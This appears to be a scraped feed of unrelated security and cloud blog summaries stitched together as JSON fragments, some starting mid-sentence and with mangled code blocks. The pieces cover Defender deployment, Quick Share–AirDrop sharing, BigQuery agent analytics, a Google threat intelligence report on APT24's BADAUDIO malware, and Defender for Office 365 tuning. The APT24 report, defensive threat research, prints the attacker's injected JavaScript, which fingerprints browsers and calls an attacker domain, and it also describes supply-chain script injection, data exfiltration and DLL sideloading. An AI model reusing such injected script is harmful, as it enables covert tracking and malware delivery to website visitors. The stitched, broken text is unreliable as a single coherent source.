broad set of Windows, macOS, iOs, Android, and Linux versions listed in image 5. We\u2019re committed to meeting you where you are to help you protect the most vulnerable points in your environment, so we are always evaluating demand and will continue to expand our coverage moving forward. Simplified deployment for Windows and Linux Organizations are faced with the challenge of securing diverse device fleets spanning multiple operating systems, hardware configurations, and user scenarios. Historically, the more diverse your operating system estate, the more complex your onboarding process, because it often requires a combination of endpoint management solutions like Microsoft Intune, but also scripts, downloads, and multiple manual installations to ensure coverage. To help security teams onboard simply and securely, we\u2019ve built new Defender deployment tools for Windows and Linux, which handle the entire process for you. Just download a single package and it will dynamically adapt to the operating system, take care of prerequisites, and install the latest version of Defender available as needed for older devices that don\u2019t have it already built in. The Defender deployment tools eliminate friction, automate tricky steps, and provide predictability throughout the onboarding journey. They also have several controls built in that allow you to test for issues before onboarding and can accommodate complex scenarios like virtual desktop infrastructure. For customers of Microsoft Intune and Microsoft Defender for Cloud, the Defender deployment tools work in tandem, available to use for legacy systems or complex scenarios. This release is the latest step in our journey to secure diverse device environments and sets the foundation for a unified and intuitive deployment experience\u2014one that meets the demands of modern IT and security teams across organizations of all sizes. We hope you\u2019ll join us online or in San Francisco for our Microsoft Ignite session on November 20 th to learn more about these and other exciting announcements in Defender\u2019s industry-leading endpoint protection.

      "title": "Android Quick Share Support for AirDrop: A Secure Approach to Cross-Platform File Sharing",
      "summary": "Posted by Dave Kleidermacher, VP, Platforms Security & Privacy, Google Technology should bring people closer together, not create walls. Being able to communicate and connect with friends and family should be easy regardless of the phone they use. That\u2019s why Android has been building experiences that help you stay connected across platforms. As part of our efforts to continue to make cross-platform communication more seamless for users, we've made Quick Share interoperable with AirDrop, allowing for two-way file sharing between Android and iOS devices, starting with the Pixel 10 Family. This new feature makes it possible to quickly share your photos, videos, and files with people you choose to communicate with, without worrying about the kind of phone they use. Most importantly, when you share personal files and content, you need to trust that it stays secure. You can share across devices with confidence knowing we built this feature with security at its core, protecting your data with strong safeguards that have been tested by independent security experts. Secure by Design We built Quick Share\u2019s interoperability support for AirDrop with the same rigorous security standards that we apply to all Google products. Our approach to security is proactive and deeply integrated into every stage of the development process. This includes: Threat Modeling: We identify and address potential security risks before they can become a problem. Internal Security Design and Privacy Reviews: Our dedicated security and privacy teams thoroughly review the design to ensure it meets our high standards. Internal Penetration Testing: We conduct extensive in-house testing to identify and fix vulnerabilities. This Secure by Design philosophy ensures that all of our products are not just functional but also fundamentally secure. This feature is also protected by a multi-layered security approach to ensure a safe sharing experience from end-to-end, regardless of what platform you\u2019re on. Secure Sharing Channel: The communication channel itself is hardened by our use of Rust to develop this feature. This memory-safe language is the industry benchmark for building secure systems and provides confidence that the connection is protected against buffer overflow attacks and other common vulnerabilities. Built-in Platform Protections: This feature is strengthened by the robust built-in security of both Android and iOS. On Android, security is built in at every layer. Our deep investment in Rust at the OS level hardens the foundation, while proactive defenses like Google Play Protect work to keep your device safe. This is complemented by the security architecture of iOS that provides its own strong safeguards that mitigate malicious files and exploitation. These overlapping protections on both platforms work in concert with the secure connection to provide comprehensive safety for your data when you share or receive. You\u2019re in Control: Sharing across platforms works just like you're used to: a file requires your approval before being received, so you're in control of what you accept. The Power of Rust: A Foundation of Secure Communication A key element of our security strategy for the interoperability layer between Quick Share and AirDrop is the use of the memory-safe Rust programming language. Recognized by security agencies around the world, including the NSA and CISA , Rust is widely considered the industry benchmark for building secure systems because it eliminates entire classes of memory-safety vulnerabilities by design. Rust is already a cornerstone of our broader initiative to eliminate memory safety bugs across Android. Its selection for this feature was deliberate, driven by the unique security challenges of cross-platform communication that demanded the most robust protections for memory safety. The core of this feature involves receiving and parsing data sent over a wireless protocol from another device. Historically, when using a memory-unsafe language, bugs in data parsing logic are one of the most common sources of high-severity security vulnerabilities. A malformed data packet sent to a parser written in a memory-unsafe language can lead to buffer overflows and other memory corruption bugs, creating an opportunity for code execution. This is precisely where Rust provides a robust defense. Its compiler enforces strict ownership and borrowing rules at compile time, which guarantees memory safety. Rust removes entire classes of memory-related bugs. This means our implementation is inherently resilient against attackers attempting to use maliciously crafted data packets to exploit memory errors. Secure Sharing Using AirDrop's \"Everyone\" Mode To ensure a seamless experience for both Android and iOS users, Quick Share currently works with AirDrop's \"Everyone for 10 minutes\" mode. This feature does not use a workaround; the connection is direct and peer-to-peer, meaning your data is never routed through a server, shared content is never logged, and no extra data is shared. As with \"Everyone for 10 minutes\" mode on any device when you\u2019re sharing between non-contacts, you can ensure you're sharing with the right person by confirming their device name on your screen with them in person. This implementation using \"Everyone for 10 minutes\u201d mode is just the first step in seamless cross-platform sharing, and we welcome the opportunity to work with Apple to enable \u201cContacts Only\u201d mode in the future. Tested by Independent Security Experts After conducting our own secure product development, internal threat modeling, privacy reviews, and red team penetration tests, we engaged with NetSPI , a leading third-party penetration testing firm, to further validate the security of this feature and conduct an independent security assessment . The assessment found the interoperability between Quick Share and AirDrop is secure, is \u201cnotably stronger\u201d than other industry implementations and does not leak any information. Based on these internal and external assessments, we believe our implementation provides a strong security foundation for cross-platform file sharing for both Android and iOS users. We will continue to evaluate and enhance the implementation\u2019s security in collaboration with additional third-party partners. To complement this deep technical audit, we also sought expert third-party perspective on our approach from Dan Boneh , a renowned security expert and professor at Stanford University: \u201cGoogle\u2019s work on this feature, including the use of memory safe Rust for the core communications layer, is a strong example of how to build secure interoperability, ensuring that cross-platform information sharing remains safe. I applaud the effort to open more secure information sharing between platforms and encourage Google and Apple to work together more on this.\" The Future of File-Sharing Should Be Interoperable This is just the first step as we work to improve the experience and expand it to more devices. We look forward to continuing to work with industry partners to make connecting and communicating across platforms a secure, seamless experience for all users.",

      "title": "From interaction to insight: Announcing BigQuery Agent Analytics for the Google ADK",
      "summary": "In a world of agentic AI, building an agent is only half the battle. The other half is understanding how users are interacting with it. What are their most common requests? Where do they get stuck? What paths lead to successful outcomes? Answering these questions is the key to refining your agent and delivering a better user experience. These insights are also super critical for optimizing agent performance. Today, we're making it easier for agent developers in Google\u2019s Agent Development Kit (ADK) to answer these questions. With a single line of code, ADK developers can stream agent interaction data directly to BigQuery and get insights into their agent activity in a scalable manner. To do so, we are introducing BigQuery Agent Analytics , a new plugin for ADK that exports your agent's interaction data directly into BigQuery to capture, analyze, and visualize agent performance, user interaction, and cost. With your agent interaction data centralized in BigQuery, analyzing critical metrics such as latency, token consumption, and tool usage is straightforward. Creating custom dashboards in tools like Looker Studio or Grafana is easy. Furthermore, you can leverage cutting-edge BigQuery capabilities including generative AI functions , vector search , and embedding generation , to perform sophisticated analysis. This enables you to cluster agent interactions, precisely gauge agent performance, and rapidly pinpoint common user queries or systemic failure patterns \u2014 all of which are essential for refining the agent experience. You can also join interaction data with relevant business datasets \u2014 for instance, linking support agent interactions with CSAT scores \u2014 to accurately measure the agent's real-world impact. This entire capability is unlocked with a minimal code change. This plugin is available in preview for ADK users today, with support for other agent frameworks soon to follow. See the plugin in action in the following video. Understanding BigQuery Agent Analytics The BigQuery Agent Analytics plugin is a very lightweight way of streaming various agent activity data directly to your BigQuery table. It consists of three main components: ADK Plugin: With a single line of code, the new ADK plugin can stream agent activity like requests, responses, LLM tool calls, etc. to a BigQuery table. Predefined BigQuery schema: We provide an optimized table schema out-of-the-box that stores rich details about user interactions, agent responses, and tool usage. Low-cost, high-performance streaming: The plugin uses the BigQuery Storage Write API to stream events directly to BigQuery in real-time. Why it matters: Data-driven agent development By integrating your agent's analytic data in BigQuery, you can go from viewing basic metrics to generating deep, actionable insights. Specifically, this integration lets you: Visualize agent usage and interactions: Gain a clear understanding of your agent's performance. Easily track key operational metrics like token consumption and tool usage to monitor costs and resource allocation. Evaluate agent quality with advanced AI: Go beyond simple metrics by using BigQuery's advanced AI capabilities. Leverage AI functions and vector search to perform quality analysis on conversation data, identifying areas for improvement with greater precision. Learn by conversing with your agent data: Create a conversational data agent that works directly with your new observability data. This allows you and your team to ask questions about your agent activity in natural language and get immediate insights, without writing complex queries. How It works We've designed the process of setting up robust analytics pipeline to be as simple as possible: 1. Add the required code: This plugin requires use of ADK\u2019s application(apps) component when building the agent. The following code demonstrates how to initialize the new plugin and make it part of your app. code_block )])]> 2. Choose what to stream and customize pre-processing: You have full control over what data you send to BigQuery. Choose the specific events you want to stream, so that you only capture the data that is most relevant to your needs. The following code example redacts dollar amounts before logging. code_block str:\\r\\n \"\"\"\\r\\n Custom formatter to redact dollar amounts (e.g., $600, $12.50)\\r\\n and ensure JSON output if the input is a dict.\\r\\n \"\"\"\\r\\n text_content = \"\"\\r\\n if isinstance(event_content, dict):\\r\\n text_content = json.dumps(event_content)\\r\\n else:\\r\\n text_content = str(event_content)\\r\\n\\r\\n # Regex to find dollar amounts: $ followed by digits, optionally with commas or decimals.\\r\\n # Examples: $600, $1,200.50, $0.99\\r\\n redacted_content = re.sub(r\\'\\\\$\\\\d+(?:,\\\\d{3})*(?:\\\\.\\\\d+)?\\', \\'xxx\\', text_content)\\r\\n return redacted_content\\r\\n\\r\\nconfig = BigQueryLoggerConfig(\\r\\n enabled=True,\\r\\n event_allowlist=[\"LLM_REQUEST\", \"LLM_RESPONSE\"], # Only log these events\\r\\n shutdown_timeout=10.0, # Wait up to 10s for logs to flush on exit\\r\\n client_close_timeout=2.0, # Wait up to 2s for BQ client to close\\r\\n max_content_length=500, # Truncate content to 500 chars (default)\\r\\n content_formatter=redact_dollar_amounts, # Redact the dollar amounts in the logging content\\r\\n)\\r\\n\\r\\nplugin = BigQueryAgentAnalyticsPlugin(..., config=config)'), ('language', ''), ('caption', )])]> And that\u2019s it \u2014 the plugin handles the rest, including auto-creating the necessary BigQuery table with the correct schema, and streaming the agent data in real-time. Now you are ready to analyze your agent metrics, using familiar BigQuery semantics. Here is an illustration of your logs as they appear in the BigQuery table using a \u201c select * limit 10\u201d on non-empty columns . Get started today It's time to unlock the full potential of your agents. With the new BigQuery Agent Analytics you can answer critical usage questions to refine your agent, optimize performance, and deliver a superior user experience. There is more to come in the near future, including integration with LangGraph to advanced analysis for multimodal agent interactions. To get started, check out the Google Cloud BigQuery Agent Analytics documentation on the Google ADK site. For a guided walkthrough on using this plugin, we invite you to explore our comprehensive new codelab . We\u2019re excited to see the amazing, data-driven conversational experiences you build.",

July 21 - July 25 Introducing partitioned index for BigQuery vector search: When creating a vector index on a partitioned BigQuery table, you now have the option to also partition your vector index. Partitioning your vector index significantly reduces query costs and improves search accuracy for vector searches that utilize pre-filtering on the partitioning column.By partitioning your vector index, BigQuery can apply partition pruning to both your table and your vector index when you use a filter on the partitioning column in your vector search. This means BigQuery only scans the relevant partitions, decreasing I/O costs. Additionally, pre-filtering on the partitioning column makes your vector searches less likely to miss relevant results. This feature is particularly beneficial if most of your vector searches target specific partitions using pre-filters. You can only partition TreeAH vector indexes, and the PARTITION BY clause used for the vector index must match the one used for the original table. Read more about the partitioned indexes in vector search.

      "title": "Beyond the Watering Hole: APT24's Pivot to Multi-Vector Attacks",
      "summary": "Written by: Harsh Parashar, Tierra Duncan, Dan Perez Google Threat Intelligence Group (GTIG) is tracking a long-running and adaptive cyber espionage campaign by APT24, a People's Republic of China (PRC)-nexus threat actor. Spanning three years, APT24 has been deploying BADAUDIO, a highly obfuscated first-stage downloader used to establish persistent access to victim networks. While earlier operations relied on broad strategic web compromises to compromise legitimate websites, APT24 has recently pivoted to using more sophisticated vectors targeting organizations in Taiwan. This includes the repeated compromise of a regional digital marketing firm to execute supply chain attacks and the use of targeted phishing campaigns. This report provides a technical analysis of the BADAUDIO malware, details the evolution of APT24's delivery mechanisms from 2022 to present, and offers actionable intelligence to help defenders detect and mitigate this persistent threat. As part of our efforts to combat serious threat actors, GTIG uses the results of our research to improve the safety and security of Google\u2019s products and users. Upon discovery, all identified websites, domains, and files are added to the Safe Browsing blocklist in order to protect web users across major browsers. We also conducted a series of victim notifications with technical details to compromised sites, enabling affected organizations to secure their sites and prevent future infections. Figure 1: BADAUDIO campaign overview Payload Analysis: BADAUDIO and Cobalt Strike Beacon Integration The BADAUDIO malware is a custom first-stage downloader written in C++ that downloads, decrypts, and executes an AES-encrypted payload from a hard-coded command and control (C2) server. The malware collects basic system information, encrypts it using a hard-coded AES key, and sends it as a cookie value with the GET request to fetch the payload. The payload, in one case identified as Cobalt Strike Beacon, is decrypted with the same key and executed in memory.

This method replaces linear code with a series of disconnected blocks governed by a central \"dispatcher\" and a state variable, forcing analysts to manually trace each execution path and significantly impeding both automated and manual reverse engineering efforts. Figure 3: Control flow flattening heavily obfuscates BADAUDIO malware ( expand image ) BADAUDIO typically manifests as a malicious Dynamic Link Library (DLL) leveraging DLL Search Order Hijacking (MITRE ATT&CK T1574.001) for execution via legitimate applications. Recent variants observed indicate a refined execution chain: encrypted archives containing BADAUDIO DLLs along with VBS, BAT, and LNK files. These supplementary files automate the placement of the BADAUDIO DLL and a legitimate executable into user directories, establish persistence through legitimate executable startup entries, and trigger the DLL sideloading. This multi-layered approach to execution and persistence minimizes direct indicators of compromise. Upon execution, BADAUDIO collects rudimentary host information: hostname, username, and system architecture. This collected data is then hashed and embedded within a cookie parameter in the C2 request header. This technique provides a subtle yet effective method for beaconing and identifying compromised systems, complicating network-based detection. In one of these cases, the subsequent payload, decrypted using a hard-coded AES key, has been confirmed as Cobalt Strike Beacon. However, it is not confirmed that Cobalt Strike is present in every instance. The Beacon payload contained a relatively unique watermark that was previously observed in a separate APT24 campaign, shared in the Indicators of Compromise section. Cobalt Strike watermarks are a unique value generated from and tied to a given \"CobaltStrike.auth\" file. This value is embedded as the last 4 bytes for all BEACON stagers and in the embedded configuration for full backdoor BEACON samples. Campaign Overview: BADAUDIO Delivery Evolves Over three years, APT24 leveraged various techniques to deliver BADAUDIO, including strategic web compromises, repeated supply-chain compromise of a regional digital marketing firm in Taiwan, and spear phishing. Figure 4: BADAUDIO campaign overview Public Strategic Web Compromise Campaign Beginning in November 2022 we observed over 20 compromised websites spanning a broad array of subjects from regional industrial concerns to recreational goods, suggesting an opportunistic approach to initial access with true targeting selectively executed against visitors the attackers identified via fingerprinting. The legitimate websites were weaponized through the injection of a malicious JavaScript payload. Figure 5: Strategic web compromise attack flow to deliver BADAUDIO malware This script exhibited an initial layer of targeting, specifically excluding macOS, iOS, Android, and various Microsoft Internet Explorer/Edge browser variants to focus exclusively on Windows systems. This selectivity suggests an adversary immediately narrowing their scope to optimize for a specific, likely high-value, victim profile. The injected JavaScript performed a critical reconnaissance function by employing the FingerprintJS library to generate a unique browser fingerprint. This fingerprint, transmitted via an HTTP request to an attacker-controlled domain, served as an implicit validation mechanism. Upon successful validation, the victim was presented with a fabricated pop-up dialog, engineered to trick the user into downloading and executing BADAUDIO malware. $(window).ready(function() { var userAgent = navigator.userAgent; var isIE = userAgent.indexOf(\"compatible\") > -1 && userAgent.indexOf(\"MSIE\") > -1; var isEdge = userAgent.indexOf(\"Edge\") > -1 && !isIE; var isIE11 = userAgent.indexOf('Trident') > -1 && userAgent.indexOf(\"rv:11.0\") > -1; var isMac = userAgent.indexOf('Macintosh') > -1; var isiPhone = userAgent.indexOf('iPhone') > -1; var isFireFox = userAgent.indexOf('Firefox') > -1; if (!isIE && !isEdge && !isIE11 && !isMac && !isiPhone && !isFireFox) { var tag_script = document.createElement(\"script\"); tag_script.type = \"text/javascript\"; tag_script.src = \"https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@2/dist/fingerprint2.min.js\"; tag_script.onload = \"initFingerprintJS()\"; document.body.appendChild(tag_script); if (typeof(callback) !== \"undefined\") { tag_script.onload = function() { callback(); } } function callback() { var option = { excludes: { screenResolution: true, availableScreenResolution: true, enumerateDevices: true } } new Fingerprint2.get(option, function(components) { var values = components.map(function(component) { return component.value }) var murmur = Fingerprint2.x64hash128(values.join(''), 31); console.log(murmur) var script_tag = document.createElement(\"script\"); script_tag.setAttribute(\"src\", \"https://www[.]twisinbeth[.]com/query.php?id=\" + murmur); document.body.appendChild(script_tag); }); } } }); Figure 6: Early malicious fingerprinting JS used in strategic web compromise campaigns Figure 7: Example of attacker fake update pop-up dialog impersonating Chrome to lure targets to download and execute BADAUDIO malware The attackers consistently shift their infrastructure, using a mix of newly registered domains and domains they have previously compromised. We last observed this tactic in early September 2025. Escalation: Supply Chain Compromise for Strategic Web Compromises at Scale In July 2024, APT24 compromised a regional digital marketing firm in Taiwan- a supply chain attack that impacted more than 1,000 domains. Notably, the firm experienced multiple re-compromises over the last year, demonstrating APT24's persistent commitment to the operation. We initiated a multifaceted remediation effort to disrupt these threats. In addition to developing custom logic to identify and block the modified, malicious JavaScript, GTIG distributed victim notifications to the individual compromised websites and the compromised marketing firm. These notifications provided specific details about the threat and the modifications made to the original script, enabling affected organizations to secure their sites and prevent future infections. In the first iteration of the supply chain compromise, APT24 injected the malicious script into a widely used JavaScript library (MITRE ATT&CK T1195.001) provided by the firm, leveraging a typosquatting domain to impersonate a legitimate Content Delivery Network (CDN). The deobfuscated JavaScript reveals a multi-stage infection chain: Dynamic Dependency Loading: The script dynamically loads legitimate jQuery and FingerprintJS2 libraries (MITRE ATT&CK T1059.007) from a public CDN if not already present, ensuring consistent execution across diverse web environments. Multi-Layer JS Concealment: During a re-compromise discovered in July 2025, the adversary took additional steps to hide their malicious code. The highly obfuscated script (MITRE ATT&CK T1059) was deliberately placed within a maliciously modified JSON file served by the vendor, which was then loaded and executed by another compromised JavaScript file. This tactic effectively concealed the final payload in a file type and structure not typically associated with code execution. Advanced Fingerprinting: FingerprintJS2 is utilized to generate an x64hash128 browser and environmental fingerprint (MITRE ATT&CK T1082) . The x64hash128 is the resulting 128-bit hash value produced by the MurmurHash3 algorithm, which processes a large input string of collected browser characteristics (such as screen resolution, installed fonts, and GPU details) to create a unique, consistent identifier for the user's device. Covert Data Exfiltration and Staging: A POST request, transmitting Base64-encoded reconnaissance data (including host, url, useragent, fingerprint, referrer, time, and a unique identifier), is sent to an attacker's endpoint (MITRE ATT&CK T1041). Adaptive Payload Delivery: Successful C2 responses trigger the dynamic loading of a subsequent script from a URL provided in the response's data field. This cloaked redirect leads to BADAUDIO landing pages, contingent on the attacker's C2 logic and fingerprint assessment (MITRE ATT&CK T1105 ). Tailored Targeting: The compromise in June 2025 initially employed conditional script loading based on a unique web ID (the specific domain name) related to the website using the compromised third-party scripts. This suggests tailored targeting, limiting the strategic web compromise (MITRE ATT&CK T1189) to a single domain. However, for a ten-day period in August, the conditions were temporarily lifted, allowing all 1,000 domains using the scripts to be compromised before the original restriction was reimposed. Figure 8: Compromised JS supply chain attack to deliver BADAUDIO malware Targeted Phishing Campaigns Complementing their broader web-based attacks, APT24 concurrently conducted highly targeted social engineering campaigns. Lures, such as an email purporting to be from an animal rescue organization, leveraged social engineering to elicit user interaction and drive direct malware downloads from attacker-controlled domains. Separate campaigns abused legitimate cloud storage platforms including Google Drive and OneDrive to distribute encrypted archives containing BADAUDIO. Google protected users by diverting these messages to spam, disrupting the threat actor\u2019s effort to leverage reputable services in their campaigns. APT24 included pixel tracking links, confirming email opens and potentially validating target interest for subsequent exploitation. This dual-pronged approach\u2014leveraging widely trusted cloud services and explicit tracking\u2014enhances their ability to conduct effective, personalized campaigns. Outlook This nearly three-year campaign is a clear example of the continued evolution of APT24\u2019s operational capabilities and highlights the sophistication of PRC-nexus threat actors. The use of advanced techniques like supply chain compromise, multi-layered social engineering, and the abuse of legitimate cloud services demonstrates the actor's capacity for persistent and adaptive espionage. This activity follows a broader trend GTIG has observed of PRC-nexus threat actors increasingly employing stealthy tactics to avoid detection. GTIG actively monitors ongoing threats from actors like APT24 to protect users and customers. As part of this effort, Google continuously updates its protections and has taken specific action against this campaign. We are committed to sharing our findings with the security community to raise awareness and to disrupt this activity. We hope that improved understanding of tactics and techniques will enhance threat hunting capabilities and lead to stronger user protections across the industry. Acknowledgements This analysis would not have been possible without the assistance from FLARE.

      "title": "Microsoft Defender for Office 365: Fine-Tuning",
      "summary": "In incident response, most business email compromise doesn\u2019t start with \u201csophisticated zero-day malware.\u201d It starts with configuration gaps: forwarding mail outside the tenant, users clicking through Safe Links warnings, impersonation policies left at day-one defaults, or post-delivery cleanup still relying on a human analyst at 2:00 AM. Those gaps are what attackers actually exploit. This blog covers our top recommendations for fine-tuning Microsoft Defender for Office 365 configuration from hundreds of deployments and recovery engagements: Core fine-tuning actions every email or security admin should land right now Data-driven bulk mail tuning (BCL and Bulk Mail Insights) Impersonation and anti-phishing policy hygiene for executive protection Automate post-delivery cleanup by enabling Automated Remediation Each section includes a short video and practical guidance you can apply immediately in Microsoft Defender for Office 365. These recommendations align with Microsoft\u2019s \u201csecure by default\u201d direction: applying the Standard and Strict preset security policies to users, using Configuration analyzer to catch configuration drift, and enforcing least-privilege release of high-risk mail. When possible, enable the Preset security policies to give you Microsoft\u2019s recommended settings for Safe Links, Safe Attachments, Anti-Phishing, and Anti-Spam. If you use custom policies (or if you exclude users from the Presets) then use Configuration analyzer regularly to compare custom policies to the Standard/Strict baselines, since those get updated as Microsoft updates the Preset policies. Core Fine-Tuning Checklist for Defender for Office 365 This section highlights six controls we recommend implementing broadly. These are \u201cday one hardening\u201d items we repeatedly validate with customers. Block automatic external forwarding by default Attackers often create hidden inbox rules that quietly forward mail (invoices, purchase orders, wire info) to an external account they control. Use outbound spam policies to block automatic external forwarding for the entire org and then create tightly scoped exceptions only for the handful of mailboxes that legitimately need it. This prevents data leakage and payment fraud scenarios where mail auto-forwards out of your tenant without anyone noticing. Although this setting is on by default (\u201cSystem Controlled\u201d means that external forwarding is disabled), we\u2019ve found many tenants where this was disabled because the admin didn\u2019t know how to create a custom policy for authorized forwarders. The trick is to order custom outbound policies to run as a higher priority than the default outbound policy which should be set to block auto-forwarded emails. It is a good idea to regularly review the auto forwarded message report (located in the Exchange Admin Center ). Use Enhanced Filtering for Connectors (\u201cskip listing\u201d) when necessary If you\u2019re routing inbound mail through a third-party Secure Email Gateway or an on-prem hop before Microsoft 365, Defender will see that intermediary as the source IP instead of the original sending IP, which degrades anti-spoofing effectiveness. Enhanced Filtering for Connectors \u2014 also called skip listing \u2014 lets Microsoft 365 look past that last hop and evaluate the real sending IP and headers, so SPF / DKIM / DMARC and anti-spam logic work correctly. This setting does not support centralized mail routing (unless the routing is linear; see the Enhanced Filtering for Connectors learn article), so make sure you are not using that before enabling Enhanced Filtering. Centralized routing is sometimes used by organizations running a hybrid Exchange deployment, connecting Exchange Online with an on-premises Exchange Server organization. Important: Do this instead of blanket SCL -1 transport rules that \u201cbypass spam filtering for anything coming from our gateway.\u201d Over-bypassing means phishing that slipped through the third-party filter can sail straight to user inboxes, which Microsoft specifically warns against. Turn on Safe Attachments protection beyond email (SharePoint, OneDrive, Teams) In the Safe Attachments \u201cGlobal settings,\u201d make sure Defender for Office 365 is set to protect files in SharePoint, OneDrive, and Microsoft Teams. When enabled, if a file is identified as malicious, Defender automatically locks the file in-place so users can\u2019t open it in Teams or OneDrive. This gives you malware detonation and containment in collaboration channels, not just email. This step closes a gap we still see a lot: customers protect mail attachments well, but shared files and Teams chats are wide open. In the 1 st part of this blog series, Microsoft MVP Purav Desai describes ( here ) how to prevent users from downloading malicious files by running a SharePoint PowerShell cmdlet: Set-SPOTenant -DisallowInfectedFileDownload $true Don\u2019t let users click through Safe Links warnings Safe Links rewrites and time-of-click scans URLs in mail, Office apps, and Teams. In the Safe Links policy, clear \u201cLet users click through to the original URL.\u201d That prevents the classic \u201cI know it says it\u2019s malicious, but I really need to see it\u2026\u201d moment. Users get blocked instead of \u201cwarned but allowed.\u201d This setting is also enforced in Microsoft\u2019s Standard AND Strict preset security policies where click-through is explicitly disabled. Go beyond the default Common Attachment filter The anti-malware policy\u2019s Common Attachment filter blocks known dangerous file extensions (executable content, scriptable content, etc.). Microsoft ships a default list (historically 50+ high-risk extensions), and you can customize it to block additional file types common in malware delivery, like HTML droppers or password-protected archives. Messages with those file types are treated as malware and quarantined. Do this centrally rather than relying on users to \u201cspot a suspicious attachment.\u201d Automation beats user judgment here. Use custom quarantine policies that require admin approval (instead of self-release) If you are not using the Preset Policies, you can create a quarantine policy to customize the user experience with quarantined messages. For anything phishing-related, I recommend creating a custom policy that allows the user to \u201crequest release from admin.\u201d That means users can raise a hand if they think something should not have been quarantined, and an Incident is created for administrators to review before it is released. To me, this strikes the best balance between security and productivity. This keeps containment intact and gives the SOC final say. It also creates an auditable workflow: who asked for release, who approved it, and why. Bulk Mail Insights: Tune BCL using your tenant\u2019s mail Bulk email (\u201cgraymail\u201d) is noisy. Payroll alerts and benefits notifications are legitimate, but they look exactly like phishing. At the same time, true marketing email (graymail) are also bulk. The traditional response (\u201cjust whitelist the sender so users stop complaining\u201d) often opens the door for attacker-looking mail to get delivered straight to executives. Defender for Office 365 gives you something better: Bulk Mail Insights (a.k.a. Bulk senders insight ). This report shows, over the last 60 days, how much mail at each Bulk Complaint Level (BCL 1\u20139) was delivered vs. blocked, which senders are generating volume, and where users are likely to experience false positives or false negatives. You can interactively simulate raising or lowering the bulk threshold and immediately see, \u201cIf we tighten BCL, how many more messages get quarantined? How many of those were probably junk? How many were probably wanted?\u201d Why this matters: You stop tuning bulk mail based on anecdotes and start tuning based on real telemetry from your own tenant. You can justify decisions to leadership and audit (\u201cWe set BCL at X because here is the simulation showing false positive/false negative impact\u201d). You avoid blanket allow rules. Instead, you adjust bulk thresholds for legitimate high-volume senders while keeping stricter actions for everyone else. Note: You can modify the BCL threshold in your default or custom anti-spam policy, but you can\u2019t change it inside the Standard (BCL:6) or Strict (BCL:5) preset security policies themselves. Standard and Strict are already aligned to Microsoft\u2019s recommended baselines.

Microsoft Defender for Office 365 includes targeted impersonation protection, but it only really works if you target your most targeted executives. Here are five pitfalls we see over and over: Empty or stale VIP list Populate \u201cusers to protect / high value targets\u201d with executives, finance approvers, legal, anyone authorized to move money or data. Review it monthly. Roles change, and you only get a finite number of protected users (for example, ~350 entries). An out-of-date list silently weakens protection for the people attackers actually impersonate. Phishing email threshold stuck at 1 forever We find organizations that are not using the preset policies have left their phishing threshold values at the default \u201c1\u201d because of initial false positives. We recommend raising it to match the Standard Preset (\u201c3\u201d) or Strict (\u201c4\u201d). Weak action If suspicious \u201cCFO\u201d mail just goes to Junk, users can still act on it. High-confidence impersonation of executives should be quarantined with AdminOnly or request-release workflows, not left in end-user control. Tie this back to the custom quarantine policies (discussed later in this article). Common-name overload If your CEO\u2019s name is something extremely common, you\u2019ll get noise. Expect it. Don\u2019t \u201cturn off\u201d protection for that name \u2014 add that address to the Trusted Senders otherwise it will be blocked as an impersonation attempt. Use Trusted Senders / Trusted Domains for known-good partners and vendors so you keep protection high without drowning in alerts. Add only legitimate senders/domains to the Trusted Senders or Trusted Domains instead of lowering enforcement. No scheduled review This control can\u2019t be \u201cset and forget.\u201d Put impersonation tuning and spoof intelligence review on a monthly checklist. That lets you catch new vendors pretending to be finance, new \u201curgent wire\u201d lure patterns, and any drift from Standard / Strict baseline that Configuration analyzer will also call out. When done right, impersonation protection is not just \u201cspam reduction.\u201d It\u2019s payment fraud prevention. Automated Investigation & Response (AIR): Let Defender remove malicious email before your SOC has to! One of the biggest wins you can land quickly is letting Microsoft Defender for Office 365 automatically remove clusters of malicious messages \u2014 without waiting for analyst approval on every single item. Here\u2019s how it works. Defender\u2019s Automated Investigation and Response (AIR) groups messages into \u201cclusters\u201d based on shared indicators like the same malicious URL or malicious file hash. If you opt in to automatic remediation for those cluster types, AIR will go find every matching copy of that threat across the tenant and soft-delete those messages, not just the one that triggered the alert. Why this matters: It turns post-delivery cleanup into something that happens immediately instead of \u201cafter Tier 1 has time to review.\u201d It removes known-bad messages from user mailboxes (and related collaboration surfaces like Teams) before a target can click. It dramatically cuts the classic \u201cDid anyone else get this?\u201d manual hunt-and-purge work that burns out SOC analysts. When you configure AIR automation settings in the Microsoft Defender portal (Settings > Email & collaboration > MDO automation settings), you\u2019ll see checkboxes for \u201cSimilar files\u201d and \u201cSimilar URLs.\u201d Selecting those opts you into automatic soft delete for those clusters. Today, soft delete is the default supported action for these automatic remediations, enabling administrators to undo a deletion, if necessary. This is Defender for Office 365 Plan 2 / Microsoft 365 E5 functionality, and it\u2019s exactly the kind of \u201csecure operations by default\u201d Microsoft has been pushing: detect, contain, and clean up automatically, then let humans investigate with context instead of manually chasing every copy of a phish. This automation triggers when malicious clusters are detected. For automating the classification and triage of user-submitted phishing incidents, check out the Security Copilot Phishing Triage Agent ( Preview) .

The decisions you make about automated remediation (AIR), bulk mail thresholds, Safe Links/Attachment behavior, outbound forwarding, connector hygiene, quarantine policy, and impersonation tuning directly determine how easy \u2014 or how hard \u2014 it is for an attacker to penetrate your organization. Microsoft\u2019s current guidance is clear: Apply Standard or Strict preset security policies so users get the recommended protections by default (for example, Safe Links with no click-through). If you must use a custom policy, review the recommendations from the Configuration analyzer monthly for new recommendations, or to catch and correct drift whenever someone weakens a control. Align internal procedures with the excellent Security Operations Guide for Defender for Office 365. Lock down quarantine so only admins can release high-risk messages, with an auditable \u201crequest release\u201d path for users. Turn on automated remediation so Defender can remove malicious clusters of messages before anyone clicks. Organizations that land these basics are in a dramatically better position during an incident. Instead of \u201cWho clicked the link?\u201d you can say, \u201cAIR already pulled it, users were blocked from clicking through, outbound forwarding is disabled, and impersonation of the CFO is quarantined for admin review.\u201d That\u2019s what \u201csecure by default\u201d actually looks like in production. ________ This blog was authored by Joe Stocker , Microsoft Security MVP and Founder of Patriot Consulting Technology Group, in partnership with the Microsoft Defender for Office 365 product team, including Paul Newell , Senior Product Manager, Microsoft Defender for Office 365.

